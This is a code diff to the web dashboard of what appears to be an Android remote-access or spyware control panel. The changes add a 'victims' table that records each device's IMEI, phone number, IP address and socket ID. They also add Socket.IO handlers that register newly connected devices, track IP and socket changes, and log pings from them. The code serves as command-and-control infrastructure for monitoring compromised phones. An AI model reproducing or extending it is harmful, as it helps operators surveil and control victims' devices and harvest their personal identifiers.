@@ -12,7 +12,8 @@
                         <th>IP Address</th>
                         <th>IMEI</th>
                         <th>API</th>
-                        <th>Location</th>
+                        <th>Socekt-ID</th>
+                        <th>Phone</th>
                         <th></th>
                     </tr>
                 </thead>
@@ -23,6 +24,7 @@
                         <td>Manager</td>
                         <td>Manager</td>
                         <td>23</td>
+                        <td>Manager</td>
                         <td>Manager</td>
                         <td class="text-end">
                             <button id="btn-connection-status" class="btn btn-outline-danger btn-rounded"><i class="fas fa-wifi"></i></button>
@@ -193,6 +195,9 @@
                     'device-id' : items[2],
                     'ip-address' : items[3],
                     'api' : items[4],
+                    'imei' : items[5],
+                    'socketid' : items[6],
+                    'phone' : items[7]
                   },
                   success: function(data){
                     $('.victims-body').append(data.htmlresponse);
@@ -228,9 +233,82 @@
           });
         }
       });
+      
+      socket.on('pingback', function(msg){
+        $.ajax({
+            url: '/log',
+            type: 'post',
+            data: {
+              'data' : `${msg['deviceid']} pinged server, connection is active`,
+              'highlight' : 'success'
+            },
+            success: function(data){
+                $('.log-class').append(data.htmlresponse);
+            }
+        });
+      })
+
+      socket.on('update_victim_ip', function(msg) {
+        var ip = document.getElementsByClassName(`ip-address-${msg['device_id']}`)
+        // set ip text msg['ipaddress']
+        $.ajax({
+            url: '/log',
+            type: 'post',
+            data: {
+              'data' : `${msg['device_id']} IP address changed to ${msg['ipaddress']}`,
+              'highlight' : 'light'
+            },
+            success: function(data){
+                $('.log-class').append(data.htmlresponse);
+            }
+        });
+      });
+
+      socket.on('update_victim_socketid', function(msg) {
+        var socketid = document.getElementsByClassName(`socket-id-${msg['device_id']}`)
+        // set socketid text to msg['socketid']
+        $.ajax({
+            url: '/log',
+            type: 'post',
+            data: {
+              'data' : `${msg['device_id']} socket id changed to ${msg['socketid']}`,
+              'highlight' : 'light'
+            },
+            success: function(data){
+                $('.log-class').append(data.htmlresponse);
+            }
+        });
+      });
 
       socket.on('new_device', function(msg) {
-        console.log("from new device")
+        var deviceid = msg['device_id']
+        $.ajax({
+          url: '/clients',
+          type: 'post',
+          data: {
+            'model' : msg['model'],
+            'device-id' : deviceid,
+            'ip-address' : msg['ipaddress'],
+            'imei' : msg['imei'],
+            'api' : msg['api'],
+            'socketid' : msg['socketid'],
+            'phone' : msg['phone']
+          },
+          success: function(data){
+            $('.victims-body').append(data.htmlresponse);
+            $.ajax({
+              url: '/log',
+              type: 'post',
+              data: {
+                'data' : `New device connected: ${deviceid}`,
+                'highlight' : 'light'
+              },
+              success: function(data){
+                  $('.log-class').append(data.htmlresponse);
+              }
+            });
+          }
+        });
       });
 
       socket.on('update value', function(msg) {
